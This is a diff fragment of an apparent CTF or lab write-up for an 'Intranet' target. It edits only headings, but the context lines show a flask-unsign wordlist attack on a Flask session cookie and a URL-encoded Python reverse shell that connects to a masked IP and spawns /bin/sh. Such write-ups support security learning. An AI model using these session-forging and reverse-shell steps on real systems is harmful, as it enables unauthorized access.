@@ -647,7 +647,7 @@ secret_key_999999
 (rosana) :~/Intranet# echo 'eyJsb2dnZWRfaW4iOnRyd********************W5kZXJzIn0.aLDGKA.1smTdr1kBmdozdXsABbPohXWavc' > sessioncookie.txt
 ```
 
-<h2><code>Secret Key</code></h2>
+<h2>Secret Key</h2>
 
 ```bash
 (rosana) :~/Intranet# flask-unsign --unsign --cookie "$(cat sessioncookie.txt)" --wordlist mylist.txt
@@ -688,7 +688,7 @@ eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
 %2Fusr%2Fbin%2Fpython3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22xx%2Exxx%2Exxx%2Exxx%22%2C52222%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27
 ```
 
-<h2>Burp´s Repeater</h2>h2>
+<h2>Burp´s Repeater</h2>
 
 ```bash
 POST /admin HTTP/1.1
